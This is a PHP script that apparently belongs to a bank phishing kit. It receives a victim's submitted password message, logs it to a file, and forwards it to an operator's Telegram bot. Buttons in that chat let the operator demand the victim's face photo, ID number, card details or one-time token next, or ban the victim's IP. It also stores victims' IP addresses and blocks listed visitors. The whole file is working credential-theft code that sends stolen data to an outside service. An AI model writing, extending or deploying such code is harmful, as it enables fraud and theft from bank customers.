<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

header('Content-Type: application/json');

// Crear archivo de log para debugging
$logFile = __DIR__ . '/../../log_clave.txt';
$log = function($msg) use ($logFile) {
    file_put_contents($logFile, date('Y-m-d H:i:s') . " | " . $msg . "\n", FILE_APPEND);
};

$log("=== INICIO procesar_clave.php ===");

// Leer raw input
$rawInput = file_get_contents('php://input');
$log("Raw input length: " . strlen($rawInput));

// Cargar config local de este banco
$configLocal = require __DIR__ . '/../../config.php';
$log("Config local cargado");

// Si config local está vacío, usar config global
$config = $configLocal;
if (empty($config['bot_token']) || empty($config['chat_id'])) {
    $log("Config local vacío, buscando config global...");
    $globalPath = __DIR__ . '/../../../config.php';
    $log("Ruta global: " . $globalPath);
    
    if (file_exists($globalPath)) {
        $config = require $globalPath;
        $log("Config global cargado exitosamente");
    } else {
        $log("ERROR: Config global no existe en: " . $globalPath);
    }
}

// Recibir datos (soporta FormData y JSON)
$input = null;
$contentType = $_SERVER['CONTENT_TYPE'] ?? '';

if (strpos($contentType, 'application/json') !== false) {
    $input = json_decode($rawInput, true);
    $log("Procesando como JSON");
} else {
    // FormData - usar $_POST
    $input = [
        'message' => $_POST['message'] ?? '',
        'transactionId' => $_POST['transactionId'] ?? ''
    ];
    $log("Procesando como FormData");
}

$log("Input keys: " . json_encode(array_keys($input ?? [])));

// Validar datos obligatorios
if (!$input || empty($input['transactionId'])) {
    $log("ERROR: Datos incompletos o sin transactionId");
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

$transactionId = $input['transactionId'];

// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
$mensaje = $input['message'] ?? '';

// Si no hay mensaje, construirlo desde los datos
if (empty($mensaje)) {
    $log("ERROR: No hay mensaje");
    echo json_encode(['status' => 'error', 'message' => 'Sin mensaje']);
    exit;
}

// Teclado de opciones
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => "Cara", 'callback_data' => "error:{$transactionId}"],
            ['text' => "Cedula", 'callback_data' => "cedula:{$transactionId}"]
        ],
        [
            ['text' => "Tarjeta", 'callback_data' => "tarjeta:{$transactionId}"],
            ['text' => "Dinamica", 'callback_data' => "pedir_dinamica:{$transactionId}"]
        ],
        [
            ['text' => "Error Logo", 'callback_data' => "error_logo:{$transactionId}"],
            ['text' => "Cajero", 'callback_data' => "error_cajero:{$transactionId}"]
        ],
        [
            ['text' => "Finalizar", 'callback_data' => "confirm_finalizar:{$transactionId}"]
        ]
    ,
                [
                    ['text' => "❌ BANEAR IP", 'callback_data' => "ban_ip:{$transactionId}"]
                ]]
];

// Preparar datos para Telegram
$data = [
    'chat_id' => $config['chat_id'],
    'text' => $mensaje,
    'parse_mode' => 'HTML',
    'reply_markup' => json_encode($keyboard)
];

// Envío a Telegram
$log("Iniciando envío a Telegram...");
$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

$log("Response HTTP code: $httpCode");
$log("Curl error: " . ($curlError ?: 'ninguno'));
$log("Response: " . substr($response, 0, 200));

$result = json_decode($response, true);

if ($httpCode === 200 && !empty($result['ok'])) {
    $messageId = $result['result']['message_id'];
    $log("Envío exitoso! MessageId: $messageId");
    
    echo json_encode([
        'status' => 'success',
        'messageId' => $messageId
    ]);
} else {
    $log("ERROR: HTTP code $httpCode, result ok: " . ($result['ok'] ? 'true' : 'false'));
    echo json_encode(['status' => 'error', 'message' => 'Error en respuesta de Telegram']);
}

$log("=== FIN procesar_clave.php ===\n");
?>